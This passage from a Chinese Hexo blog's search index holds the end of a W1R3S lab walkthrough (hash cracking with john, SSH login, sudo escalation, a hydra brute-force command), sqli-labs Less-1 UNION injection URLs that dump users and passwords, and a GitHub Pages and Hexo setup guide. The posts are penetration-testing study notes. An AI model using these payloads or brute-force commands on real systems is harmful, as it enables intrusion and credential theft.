hash爆破</h1><blockquote><p>john shadow.hash</p></blockquote><p>破解密码</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072126969.png" alt="image-20240507212631246"></p><p>可以看到已经破解得到两个,测试使用ssh进行连接</p><p><code>www-data</code>一般是功能型账户</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072127199.png" alt="image-20240507212726362"></p><p>成功连接w1r3s账户,通过<code>id</code>命令可以得知其具有sudo权限,通过<code>sudo su</code>命令成功获得系统<code>root</code>权限.</p><p>至此完成提权.</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072130619.png" alt="image-20240507213005562"></p><h1 id="9-hydra破解ssh"><a href="#9-hydra破解ssh" class="headerlink" title="9. hydra破解ssh"></a>9. hydra破解ssh</h1><p>一般不使用该方法,没什么技术含量可言</p><p>创建字典</p><blockquote><p>vim user.list</p><p>w1r3s</p><p>admin</p><p>root</p></blockquote><blockquote><p>hydra -l user.list -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh:192.168.31.52 -t 4</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405072146373.png" alt="image-20240507214604323"></p><p>有博主破解出来了,反正我没破解出来,再见了,下机,反正不是什么实用的方法.</p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶日记</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs通关笔记</title>
    <link href="/2024/05/07/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/05/07/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/rebootORZ/articles/12293136.html">SQL注入靶场Sqli-Labs 1-65关全部通关笔记【持续更新】 - rebootORZ - 博客园 (cnblogs.com)</a></p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>单引号报错，确认存在注入点：</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071328311.png" alt="image-20240507132019873"></p><p>猜测网络数据库的字段数：4字段报错，证明字段少于4，再次猜测</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 1,2,3,4--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071337494.png" alt="image-20240507133701444"></p><p>稍微减少一点进行猜测，猜测有3个字段：</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 1,2,3--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071338842.png" alt="image-20240507133817799"></p><p>3字段未报错，证明应该是存在3个字段的；使用union注入查看哪些字段是有回显的</p><p> 这里为了不让前面id&#x3D;1的查询成功影响我们的判断，所以将1改为任意使其查询失败的值（当然也可以用 and 1&#x3D;2之类的，只要能查询失败即可）</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,2,3--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071347387.png" alt="image-20240507134733342"></p><p>可以看到只有字段2和3的位置是存在回显的，所以我们此时需要通过字段2和3进行查询数据库的信息。</p><p>接下我们使用字段2和3会先数据库名和数据库版本信息</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,database(),version()--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071352390.png" alt="image-20240507135215349"></p><p>可知数据库的名称是security，数据库版本是：5.0.96-community</p><p>查询所有的数据库名</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071355657.png" alt="image-20240507135531614"></p><p>可以看到存在三个数据库分别为<code>information_schema,challenges,mysql,security</code></p><p>查看<code>security</code>数据库下的所有表名</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071358772.png" alt="image-20240507135857727"></p><p>可以看到<code>security</code>数据库中所有的表名<code>emails,referers,uagents,users</code></p><p>根据表名可以看出<code>users</code>表内的数据信息可能更加重要，查看<code>users</code>表内的列名</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071403686.png" alt="image-20240507140322639"></p><p>可以看到该表存储这用户名和密码，再次通过查表得到这些用户名和密码</p><blockquote><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and 1=2 union select 1,group_concat(username),group_concat(password) from users--+</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405071406116.png" alt="image-20240507140613071"><br>确实得到了用户名和密码，此关卡也就到此结束了，对于实际情况下，则能够运用这些用户名和密码进行进一步的攻击了。</p>]]></content>
    
    
    <categories>
      
      <category>web基础漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github.io+hexo搭建个人博客</title>
    <link href="/2024/05/05/github-io-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2024/05/05/github-io-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="一、环境安装"><a href="#一、环境安装" class="headerlink" title="一、环境安装"></a>一、环境安装</h1><h2 id="1-1-必备环境安装"><a href="#1-1-必备环境安装" class="headerlink" title="1.1 必备环境安装"></a>1.1 必备环境安装</h2><p><a href="https://nodejs.org/en/">Node.js — Run JavaScript Everywhere (nodejs.org)</a></p><p><a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a></p><p>这是必备的两个基本环境，请先安装这两个基本环境，网上均有教程，请参考其他教程进行安装</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659772.png" alt="image-20240505141421146"></p><p>运行这三条指令能够出现相应的版本号即可，不要求版本号相同。</p><h1 id="二、github-io仓库创建"><a href="#二、github-io仓库创建" class="headerlink" title="二、github.io仓库创建"></a>二、github.io仓库创建</h1><p>创建github page仓库的仓库名规则<code>&lt;用户名&gt;.github.io</code>如下图所示，并选择公开项目。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659455.png" alt="image-20240505141654227"></p><p>点击Actions，查看页面运行状态，等待其成功运行部署，这个过程可能会有点漫长可以稍等1分钟左右</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061659541.png" alt="image-20240505141919262"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700350.png" alt="image-20240505141957864"></p><p>成功运行后，通过访问<code>https://&lt;用户名&gt;.github.io</code>基于访问看到基础页面。（如果报错，可以删除仓库重复上述过程，或者寻找其他大佬的文章解决错误）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700191.png" alt="image-20240505142102518"></p><p>这样初步的界面就已经搭建出来了，具有前端知识的大佬可以传自己的博客模板到新建的仓库即可看到自己的博客了，我这样的鼠鼠还得通过hexo去使用模板</p><h1 id="三、上传博客模板"><a href="#三、上传博客模板" class="headerlink" title="三、上传博客模板"></a>三、上传博客模板</h1><h2 id="3-1-安装Hexo"><a href="#3-1-安装Hexo" class="headerlink" title="3.1 安装Hexo"></a>3.1 安装Hexo</h2><p>使用 npm 一键安装 Hexo 博客程序：（此为全局安装命令，一般也推荐全局安装，局部安装我也没搞懂）</p><blockquote><p>npm install -g hexo-cli</p></blockquote><h2 id="3-2-Hexo本地"><a href="#3-2-Hexo本地" class="headerlink" title="3.2 Hexo本地"></a>3.2 Hexo本地</h2><p>首先在自己想要的地方创建一个空文件夹来初始化hexo</p><blockquote><p>hexo init      # 初始化<br>npm install    # 安装组件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700645.png" alt="image-20240505142944417"></p><p>完成上述初始化后，在继续执行下方指令生成页面也本地预览，访问本地网址<a href="http://localhost:4000/">http://localhost:4000/</a></p><blockquote><p>hexo g   # 生成页面<br>hexo s   # 启动预览</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700266.png" alt="image-20240505143118833"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700068.png" alt="image-20240505143129696"></p><p>至此，本地hexo已经成功，我们将我们生成的模板上传到自己的github.io仓库中，即可实现访问我们的github page得到相应的博客模板</p><h2 id="3-3-部署到github"><a href="#3-3-部署到github" class="headerlink" title="3.3 部署到github"></a>3.3 部署到github</h2><p>修改刚才我们初始化hexo文件中的<code>_config.yml</code>文件中最后的配置</p><blockquote><p>deploy:</p><p>type: git</p><p>repo: <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;</a>:&lt;用户名&gt;&#x2F;&lt;用户名&gt;.github.io.git </p><p>branch: main(这个分支根据自己的主分支进行修改，有的人是master)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700501.png" alt="image-20240505150515357"></p><p>修改保存退出，然后再命令行执行指令</p><blockquote><p>npm install hexo-deployer-git –save</p><p>hexo d</p></blockquote><p>再次等待Actions运行成功，这个过程稍微一点漫长，成功后，访问我们的github page网页即可，即网址<code>https://&lt;用户名&gt;.github.io</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700814.png" alt="image-20240505144127778"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700127.png" alt="image-20240505144240827"></p><h1 id="四、发布文章"><a href="#四、发布文章" class="headerlink" title="四、发布文章"></a>四、发布文章</h1><p>进入博客所在目录执行命令:</p><blockquote><p>hexo new “&lt;文章名称&gt;”</p></blockquote><p>新建的文章的<code>.md</code>文件会被保存在<code>根目录/sorce/_posts/</code>下面，将文章内容写入<code>.md</code>文件中，再次生成页面，上传到github上即可</p><blockquote><p>hexo clean#清理</p><p>hexo g</p><p>hexo d</p></blockquote><h1 id="五、hexo模板主题切换"><a href="#五、hexo模板主题切换" class="headerlink" title="五、hexo模板主题切换"></a>五、hexo模板主题切换</h1><ol><li>选择自己喜欢的主题</li></ol><p>主题网址：<a href="https://hexo.io/themes/">Themes | Hexo</a></p><p>以下选择主题<a href="https://github.com/saicaca/hexo-theme-vivia">saicaca&#x2F;hexo-theme-vivia: A clean and minimalist theme for Hexo. (github.com)</a>举例安装主题</p><p>每个主题的安装方式都类似，但又有细微的差距，差距来源于他们的依赖以及插件的不同。</p><ol start="2"><li>阅读安装步骤</li></ol><p>每个主题都会列有相应的安装步骤，教你怎么装，跟着装就是了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700723.png" alt="image-20240422161014628"></p><p>例如，上述主题的安装步骤</p><p>我推荐直接下载源代码，然后将源代码解压，放置到相应的hexo文件夹的themes文件夹下即可。</p><p>因为git clone命令不稳定，导致有时候下载不成功。npm下载嘛，没试过，因为不确定它会把主题下到哪儿去。</p><blockquote><p>进入hexo的博客文件夹执行下方命令即可。</p><p>git clone <a href="https://github.com/saicaca/hexo-theme-vivia.git">https://github.com/saicaca/hexo-theme-vivia.git</a> themes&#x2F;vivia7(存在名字可以做更改)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061700897.png" alt="image-20240422161529504"></p><ol start="3"><li>安装相关依赖</li></ol><p>有些主题并不需要安装相关依赖，有些则需要，所以根据主题的要求进行安装即可，示例主题需要通过下方命令安装依赖，则在根目录执行下方命令即可。</p><blockquote><p>npm install colorjs.io stylus hexo-symbols-count-time</p></blockquote><ol start="3"><li>切换主题</li></ol><p>打开博客文件夹根目录下的<code>_config.yml</code>文件，对其中的<code>theme</code>字段的值进行修改，修改为刚才下载主题存储在themes文件夹下的主题文件夹的名称<code>hexo-theme-vivia</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701077.png" alt="image-20240422161736726"></p><p>另外，修改<code>language</code>字段的值为<code>zh-CN</code>，将语言切换到中文。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405061701498.png" alt="image-20240422161833753"></p><ol start="6"><li>再次部署博客即可</li></ol><blockquote><p>hexo g &amp;&amp; hexo clean &amp;&amp; hexo d</p></blockquote><p>注意：有些主题可能存在问题，自己再换一个就是啦。</p><p>最后最后，可能你想问，那我怎么修改主题中的各种文本和加标签呢？</p><p>答案：对主题的<code>.yml</code>文件或者根目录自带的<code>_config.yml</code>进行修改，达到自己想要的效果，可以参考官方文档<a href="https://hexo.io/zh-cn/docs/configuration">配置 | Hexo</a>，或者各位大佬的博客。</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
      <tag>美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
